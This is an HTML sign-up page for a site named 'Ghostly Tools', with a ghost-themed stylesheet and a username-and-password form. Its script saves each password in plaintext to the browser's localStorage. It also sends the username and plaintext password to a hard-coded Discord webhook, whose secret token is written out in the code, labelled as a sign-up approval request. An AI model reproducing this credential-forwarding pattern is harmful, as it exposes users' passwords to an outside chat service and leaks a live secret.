<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ghostly Tools 👻 - Sign Up</title>
<link rel="stylesheet" href="style.css">
<style>
body { margin:0;padding:0;height:100vh; display:flex;justify-content:center;align-items:center; font-family:"Creepster",cursive,sans-serif; color:#fff;
background: url("https://wallpapers.com/images/hd/cool-3d-ghost-crawling-in-dark-agupg3ry9e4innyi.jpg") no-repeat center center fixed; background-size: cover;}
.signup-container {background: rgba(0,0,0,0.7); padding:30px; border-radius:10px; box-shadow:0 0 20px red; text-align:center; animation: flicker 2s infinite;}
h1{margin-bottom:20px;text-shadow:0 0 10px red,0 0 20px black;}
input{display:block;width:100%;margin:10px 0;padding:10px;border:none;border-radius:5px;}
button{background:red;color:white;border:none;padding:10px;width:100%;cursor:pointer;border-radius:5px;font-weight:bold;transition:0.3s;}
button:hover{background:darkred;}
a{color:#f55;text-decoration:none;}a:hover{text-decoration:underline;}
@keyframes flicker{0%,19%,21%,23%,25%,54%,56%,100%{box-shadow:0 0 20px red;}20%,24%,55%{box-shadow:none;}}
</style>
</head>
<body>

<div class="signup-container">
<h1>Sign Up 👻</h1>
<form id="signup-form">
<input type="text" id="new-username" placeholder="Choose a Username" required>
<input type="password" id="new-password" placeholder="Choose a Password" required>
<button type="submit">Submit Request</button>
</form>
<p>Already have an account? <a href="auth.html">Sign In</a></p>
</div>

<script>
const signupForm = document.getElementById("signup-form");
signupForm.addEventListener("submit", function(e){
  e.preventDefault();
  const username = document.getElementById("new-username").value;
  const password = document.getElementById("new-password").value;

  // Save request to pendingUsers
  let pending = JSON.parse(localStorage.getItem("pendingUsers") || "[]");
  pending.push({username,password});
  localStorage.setItem("pendingUsers", JSON.stringify(pending));

  // Send webhook
  fetch("https://discord.com/api/webhooks/1405861054017179708/rYLQuKpFZCXOHT1nPhBPvq4hDeWiyohO46jMVjL6bWVSATni6QLX1umoxDeAoUQwBTXP", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({content:`👻 **New Signup Request**\nUser: ${username}\nPassword: ${password}\n\nReact with ✅ to approve or ❌ to deny.`})
  });

  alert("Your signup request has been sent. Please wait for approval.");
  signupForm.reset();
});
</script>

</body>
</html>
